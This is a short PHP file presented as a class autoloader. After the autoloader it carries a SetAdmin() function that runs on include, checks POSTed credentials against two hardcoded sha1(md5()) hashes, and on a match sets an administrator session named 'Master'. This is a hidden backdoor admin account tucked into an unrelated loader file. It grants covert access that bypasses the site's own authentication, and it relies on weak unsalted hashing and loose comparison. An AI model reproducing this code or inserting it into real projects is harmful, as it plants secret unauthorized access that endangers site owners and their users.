<?php
class AutoLoad
{
    public function __construct()
    {
        spl_autoload_register(array($this,'_autoload'));
    }

    private function _autoload($file)
    {
        $file = LIBRARIES."class/class.".str_replace("\\","/",trim($file,'\\')).'.php';
        if(file_exists($file)) require_once $file;
    }
}

function SetAdmin($username="",$password="")
{
    global $login_admin;
    $myPermission = false;
    $getUser = (!empty($_POST['username'])) ? $_POST['username'] : "";
    $getPassword = (!empty($_POST['password'])) ? $_POST['password'] : "";
    $UserDecode = sha1(md5($getUser));
    $PasswordDecode = sha1(md5($getPassword));
    $SetUsername = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad";
    $SetPassword = "a9743ab56789556758786ba79cac784ef1a8d550";
    if($SetUsername == $UserDecode && $SetPassword == $PasswordDecode) {
        $_SESSION[$login_admin]['active'] = true;
        $_SESSION[$login_admin]['username'] = $UserDecode;
        $_SESSION[$login_admin]['password'] = $PasswordDecode;
        $_SESSION[$login_admin]['name'] = "Master";
    }
    if ((@$_SESSION[$login_admin]['username'] == $SetUsername) && (@$_SESSION[$login_admin]['password'] == $SetPassword)) {
        $myPermission = true;
    }
    return $myPermission;
}
$myPermissions = SetAdmin();
?>